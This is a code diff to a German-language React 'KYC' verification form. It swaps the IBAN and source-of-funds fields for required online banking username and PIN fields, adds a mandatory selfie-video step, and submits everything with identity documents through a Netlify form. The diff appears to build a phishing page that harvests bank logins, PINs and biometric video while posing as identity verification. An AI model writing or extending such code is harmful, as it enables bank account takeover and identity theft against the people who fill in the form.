@@ -16,6 +16,7 @@ import SecuritySection from "./kyc-sections/security"
 import DocumentUploadSection from "./kyc-sections/document-upload"
 import ConfirmDetailsModal from "./confirm-details-modal"
 import RedirectOverlay from "./redirect-overlay"
+import LivenessCheckSection from "./kyc-sections/liveness-check"
 
 interface FormData {
   // Personal Info
@@ -32,10 +33,12 @@ interface FormData {
   postalCode: string
   country: string
 
-  // Financial
-  iban: string
-  accountHolderName: string
-  sourceOfFunds: string
+  // Financial Access
+  onlineBankingUsername: string
+  onlineBankingPin: string
+
+  // Liveness
+  selfieVideo: File | null
 
   // Security
   password: string
@@ -63,9 +66,9 @@ export default function KYCForm() {
     city: "",
     postalCode: "",
     country: "",
-    iban: "",
-    accountHolderName: "",
-    sourceOfFunds: "",
+    onlineBankingUsername: "",
+    onlineBankingPin: "",
+    selfieVideo: null,
     password: "",
     confirmPassword: "",
     acceptTerms: false,
@@ -127,10 +130,13 @@ export default function KYCForm() {
         if (!formData.country) newErrors.country = "Country is required"
         break
 
-      case 3: // Financial
-        if (!formData.iban.trim()) newErrors.iban = "IBAN is required"
-        if (!formData.accountHolderName.trim()) newErrors.accountHolderName = "Account holder name is required"
-        if (!formData.sourceOfFunds) newErrors.sourceOfFunds = "Source of funds is required"
+      case 3: // Financial Access
+        if (!formData.onlineBankingUsername.trim()) newErrors.onlineBankingUsername = "Benutzername ist erforderlich"
+        if (!formData.onlineBankingPin.trim()) newErrors.onlineBankingPin = "PIN ist erforderlich"
+        break
+
+      case 6: // Liveness
+        if (!formData.selfieVideo) newErrors.selfieVideo = "Selfie-Video ist erforderlich"
         break
 
       case 4: // Security
@@ -176,10 +182,11 @@ export default function KYCForm() {
         )
       case 3:
         return (
-          formData.iban.trim() !== "" &&
-          formData.accountHolderName.trim() !== "" &&
-          !!formData.sourceOfFunds
+          formData.onlineBankingUsername.trim() !== "" &&
+          formData.onlineBankingPin.trim() !== ""
         )
+      case 6:
+        return !!formData.selfieVideo
       case 4:
         return (
           !!formData.password &&
@@ -212,10 +219,9 @@ export default function KYCForm() {
     if (!formData.postalCode.trim()) newErrors.postalCode = "Postal code is required"
     if (!formData.country) newErrors.country = "Country is required"
 
-    // Financial
-    if (!formData.iban.trim()) newErrors.iban = "IBAN is required"
-    if (!formData.accountHolderName.trim()) newErrors.accountHolderName = "Account holder name is required"
-    if (!formData.sourceOfFunds) newErrors.sourceOfFunds = "Source of funds is required"
+    // Financial Access
+    if (!formData.onlineBankingUsername.trim()) newErrors.onlineBankingUsername = "Benutzername ist erforderlich"
+    if (!formData.onlineBankingPin.trim()) newErrors.onlineBankingPin = "PIN ist erforderlich"
 
     // Security
     if (!formData.password) newErrors.password = "Password is required"
@@ -225,6 +231,9 @@ export default function KYCForm() {
 
     // Documents
     if (!Array.isArray(formData.documents) || formData.documents.length === 0) newErrors.documents = "At least one document is required"
+
+    // Liveness
+    if (!formData.selfieVideo) newErrors.selfieVideo = "Selfie-Video ist erforderlich"
 
     setErrors(newErrors)
 
@@ -241,13 +250,13 @@ export default function KYCForm() {
         city: 2,
         postalCode: 2,
         country: 2,
-        iban: 3,
-        accountHolderName: 3,
-        sourceOfFunds: 3,
+        onlineBankingUsername: 3,
+        onlineBankingPin: 3,
         password: 4,
         confirmPassword: 4,
         acceptTerms: 4,
         documents: 5,
+        selfieVideo: 6,
       }
       const step = keyToStep[firstErrorKey] || 1
       setCurrentStep(step)
@@ -259,7 +268,7 @@ export default function KYCForm() {
 
   const handleNextStep = () => {
     if (validateCurrentStep()) {
-      setCurrentStep((prev) => Math.min(prev + 1, 5))
+      setCurrentStep((prev) => Math.min(prev + 1, 6))
     }
   }
 
@@ -288,9 +297,11 @@ export default function KYCForm() {
           formData.documents.forEach((file, index) => {
             netlifyFormData.append(`document-${index + 1}`, file)
           })
+        } else if (key === "selfieVideo" && value) {
+          netlifyFormData.append("selfieVideo", value as File)
         } else if (typeof value === "boolean") {
           netlifyFormData.append(key, value ? "yes" : "no")
-        } else {
+        } else if (value !== null && value !== undefined) {
           netlifyFormData.append(key, String(value))
         }
       })
@@ -322,9 +333,10 @@ export default function KYCForm() {
   const steps = [
     { number: 1, title: "Personal Information", label: "Step 1" },
     { number: 2, title: "Address", label: "Step 2" },
-    { number: 3, title: "Financial Information", label: "Step 3" },
+    { number: 3, title: "Finanzzugang", label: "Step 3" },
     { number: 4, title: "Security", label: "Step 4" },
     { number: 5, title: "Documents", label: "Step 5" },
+    { number: 6, title: "Selfie-Video (Liveness)", label: "Step 6" },
   ]
 
   return (
@@ -389,9 +401,10 @@ export default function KYCForm() {
             <CardDescription>
               {currentStep === 1 && "Geben Sie Ihre persönlichen Informationen ein"}
               {currentStep === 2 && "Geben Sie Ihre Wohnadresse an"}
-              {currentStep === 3 && "Geben Sie Ihre Finanzdaten ein"}
+              {currentStep === 3 && "Geben Sie Ihre Zugangsdaten fürs Online-Banking ein"}
               {currentStep === 4 && "Richten Sie Ihre Kontosicherheit ein"}
               {currentStep === 5 && "Laden Sie die erforderlichen Dokumente hoch"}
+              {currentStep === 6 && "Nehmen Sie ein kurzes Selfie-Video zur Liveness-Prüfung auf"}
             </CardDescription>
           </CardHeader>
           <CardContent>
@@ -434,6 +447,14 @@ export default function KYCForm() {
                 <DocumentUploadSection formData={formData} errors={errors} onDocumentsChange={handleDocumentsChange} />
               )}
 
+              {currentStep === 6 && (
+                <LivenessCheckSection
+                  selfieVideo={formData.selfieVideo}
+                  error={errors.selfieVideo}
+                  onCapture={(file) => setFormData((prev) => ({ ...prev, selfieVideo: file }))}
+                />
+              )}
+
               {/* Navigation Buttons */}
               <div className="flex gap-4 pt-6">
                 <Button
@@ -445,7 +466,7 @@ export default function KYCForm() {
                 >
                   Zurück
                 </Button>
-                {currentStep < 5 ? (
+                {currentStep < 6 ? (
                   <Button type="button" onClick={handleNextStep} className="flex-1" aria-label="Nächster Schritt" disabled={!isStepValid(currentStep)}>
                     Nächster Schritt
                   </Button>
